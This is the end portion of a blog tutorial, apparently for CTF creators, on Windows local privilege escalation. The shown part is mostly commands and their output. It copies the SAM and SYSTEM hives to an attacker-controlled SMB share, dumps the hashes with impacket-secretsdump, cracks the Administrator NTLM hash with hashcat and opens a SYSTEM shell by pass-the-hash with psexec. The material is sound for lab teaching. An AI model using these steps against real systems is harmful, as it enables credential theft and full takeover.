+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="nv">$pass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;p@ssw0rd&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span><span class="p">(</span><span class="s1">&#39;low&#39;</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="nb">New-PSDrive</span> <span class="n">-Name</span> <span class="s2">&#34;share&#34;</span> <span class="n">-PSProvider</span> <span class="s2">&#34;FileSystem&#34;</span> <span class="n">-Root</span> <span class="s2">&#34;\\192.168.119.130\share&#34;</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Transfer the files to your host:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="nb">cp </span><span class="n">C:</span><span class="p">\</span><span class="n">sam</span>  <span class="p">\\</span><span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="p">\</span><span class="n">share</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="nb">cp </span><span class="n">C:</span><span class="p">\</span><span class="n">system</span> <span class="p">\\</span><span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="p">\</span><span class="n">share</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we have transferred these files to the attacker host:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ ls -l sam
+</span></span><span class="line"><span class="cl">.rwxr-xr-x root root <span class="m">48</span> KB Tue Mar  <span class="m">8</span> 17:48:37 <span class="m">2022</span>  sam
+</span></span><span class="line"><span class="cl">❯ ls -l system
+</span></span><span class="line"><span class="cl">.rwxr-xr-x root root <span class="m">12</span> MB Tue Mar  <span class="m">8</span> 17:49:40 <span class="m">2022</span>  system
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Use secretsdump from impacket to dump out the hashes from the SAM and SYSTEM files:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ impacket-secretsdump -sam sam -system system LOCAL
+</span></span><span class="line"><span class="cl">Impacket v0.9.24 - Copyright <span class="m">2021</span> SecureAuth Corporation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Target system bootKey: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping <span class="nb">local</span> SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Administrator:500:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb:::
+</span></span><span class="line"><span class="cl">Guest:501:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
+</span></span><span class="line"><span class="cl">DefaultAccount:503:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
+</span></span><span class="line"><span class="cl">WDAGUtilityAccount:504:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
+</span></span><span class="line"><span class="cl">user:1001:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Save the hash and the password to a file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ <span class="nb">echo</span> <span class="s1">&#39;a9a46a3fc0b4efcd2baf566ffe2a209b&#39;</span> &gt; hash.txt
+</span></span><span class="line"><span class="cl">❯ <span class="nb">echo</span> <span class="s1">&#39;con123&#39;</span> &gt; pass.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With that we can simulate a dictionary attack of the Administrator user NTLM hash using hashcat:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ hashcat -m <span class="m">1000</span> --force hash.txt pass.txt
+</span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:con123
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Session..........: hashcat
+</span></span><span class="line"><span class="cl">Status...........: Cracked
+</span></span><span class="line"><span class="cl">Hash.Name........: NTLM
+</span></span><span class="line"><span class="cl">Hash.Target......: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+</span></span><span class="line"><span class="cl">Time.Started.....: Tue Mar  <span class="m">8</span> 18:05:45 2022, <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Time.Estimated...: Tue Mar  <span class="m">8</span> 18:05:45 2022, <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>pass.txt<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Speed.#1.........:       <span class="m">21</span> H/s <span class="o">(</span>0.00ms<span class="o">)</span> @ Accel:1024 Loops:1 Thr:1 Vec:8
+</span></span><span class="line"><span class="cl">Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests
+</span></span><span class="line"><span class="cl">Progress.........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Rejected.........: 0/1 <span class="o">(</span>0.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Restore.Point....: 0/1 <span class="o">(</span>0.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span class="line"><span class="cl">Candidates.#1....: con123 -&gt; con123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can use the cracked password to log in as the Administrator user.</p>
+<p>Alternatively, we can use the hash to perform a Pass-The-Hash attack that will spawn a shell running as administrator without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ impacket-psexec -hashes <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxx&#39;</span> Administrator@192.168.119.129
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Impacket v0.9.24 - Copyright <span class="m">2021</span> SecureAuth Corporation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on 192.168.119.129.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file vlAbGeHR.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 192.168.119.129.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service zKiJ on 192.168.119.129.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service zKiJ.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.22000.493<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; whoami /all
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">USER INFORMATION
+</span></span><span class="line"><span class="cl">----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User Name           <span class="nv">SID</span>
+</span></span><span class="line"><span class="cl"><span class="o">===================</span> <span class="o">========</span>
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem S-1-5-18
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GROUP INFORMATION
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Group Name                             Type             SID          <span class="nv">Attributes</span>
+</span></span><span class="line"><span class="cl"><span class="o">======================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\A</span>dministrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
+</span></span><span class="line"><span class="cl">Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\S</span>ystem Mandatory Level Label            S-1-16-16384
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-03-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/credential-hunting/">Credential Hunting</a>,&nbsp;<a href="/tags/plain-text-files/">Plain-Text Files</a>,&nbsp;<a href="/tags/answer-files/">Answer Files</a>,&nbsp;<a href="/tags/windows-credential-manager/">Windows Credential Manager</a>,&nbsp;<a href="/tags/ask-for-credentials/">Ask for Credentials</a>,&nbsp;<a href="/tags/local-privilege-escalation/">Local Privilege Escalation</a>,&nbsp;<a href="/tags/windows/">Windows</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/windows-privesc-dll-hijacking/" class="prev" rel="prev" title="Windows Local Privilege Escalation - DLL Hijacking for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation - DLL Hijacking for CTF Creators</a>
+            <a href="/windows-privesc-apps/" class="next" rel="next" title="Windows Local Privilege Escalation - Applications for CTF Creators">Windows Local Privilege Escalation - Applications for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
